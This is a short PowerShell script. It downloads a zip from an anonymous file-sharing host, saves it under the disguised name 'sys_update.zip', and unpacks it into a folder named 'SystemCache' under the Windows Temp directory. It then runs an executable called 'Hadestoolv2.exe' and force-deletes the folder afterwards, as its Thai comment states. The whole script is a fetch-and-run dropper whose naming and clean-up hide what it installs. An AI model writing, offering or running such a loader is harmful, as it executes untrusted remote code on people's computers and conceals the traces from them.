$folder = "$env:SystemRoot\Temp\SystemCache"
if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }

$zipUrl = "https://files.catbox.moe/zvd84i.zip"
$zipPath = "$env:TEMP\sys_update.zip"

Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $folder -Force
Remove-Item $zipPath -ErrorAction SilentlyContinue

# รันโปรแกรมและรอให้ปิดตัวลง จากนั้นสั่งลบโฟลเดอร์ทิ้งทันที
Start-Process -FilePath "$folder\Hadestoolv2.exe" -Wait
Remove-Item $folder -Recurse -Force -ErrorAction SilentlyContinue
